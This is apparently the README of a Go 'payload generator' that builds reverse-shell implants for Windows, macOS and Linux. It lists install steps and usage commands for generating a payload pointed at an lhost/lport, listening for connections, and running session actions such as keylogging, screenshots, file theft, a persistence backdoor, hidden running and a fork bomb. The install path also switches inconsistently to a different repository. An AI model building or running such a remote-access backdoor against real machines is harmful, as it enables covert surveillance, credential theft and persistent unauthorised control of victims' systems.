<p align="center">
  <img src="https://github.com/1os4r/Controls/blob/master/content/logo.png">
</p>

<h1 align="center">Controls Payload Generator</h1>
<p align="center">
  <a href="https://golang.org/">
    <img src="https://img.shields.io/badge/Golang-1.11-blue.svg">
  </a>
  <a href="https://github.com/1os4r/Controls/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/1os4r/Controls/blob/master/main.go">
    <img src="https://img.shields.io/badge/Release-3.0-red.svg">
  </a>
</p>

<p align="center">
  Controls用来生成控制远程操作系统的Poc。
</p>

## Install
```bash
$ go get github.com/1os4r/Controls
$ go get github.com/kbinani/screenshot
$ go get github.com/lxn/win
$ go get github.com/matishsiao/goInfo
$ go get golang.org/x/sys/windows
$ cd ~/go/src/github.com/HexChristmas/Christmas
$ go run main.go
```

## How to Use

命令    | 参数及介绍
:-----      |:-----
`generate`  |生成控制程序 (```e.g```. `generate lhost=192.168.0.100 lport=8080 fname=chaos --windows`)
`lhost=`    |指定目标ip
`lport=`    |指定目标端口
`fname=`    |指定输出文件名称
`--windows` |目标系统为``` Windows```
`--macos`   |猎目标系统为 ```Mac OS```
`--linux`   |目标系统为 ```Linux```
`listen`    |从本地的一个端口监听 (```e.g```. `listen lport=8080`)
`serve`     |服务文件
`exit`      |退出

命令    | 参数及介绍
:-----                  |:-----
`download`              |下载文件
`upload`                |上传文件
`screenshot`            |截屏
`keylogger_start`       |键盘记录
`keylogger_show`        |输出键盘记录内容
`persistence_enable`    |维持后门
`persistence_disable`   |移除后门
`getos`                 |获取系统名称
`lockscreen`            |锁定目标屏幕
`openurl`               |打开指定```URL```
`bomb`                  |内存炸弹
`clear`                 |清屏
`back`                  |挂起会话
`exit`                  |关闭会话

## Features

| 功能                 |  Linux  |  MacOS  |  Win |
|:-------------------------|:-------:|:------:|:-----:|
| `Reverse Shell`          |    X    |    X   |   X   |
| `Download File`          |    X    |    X   |   X   |
| `Upload File`            |    X    |    X   |   X   |
| `Screenshot`             |    X    |    X   |   X   |
| `Keylogger`              |    X    |        |       |
| `Persistence`            |    X    |        |       |
| `Open URL`               |    X    |    X   |   X   |
| `Get OS Info`            |    X    |    X   |   X   |
| `Fork Bomb`              |    X    |    X   |   X   |
| `Run Hidden`             |    X    |        |       |
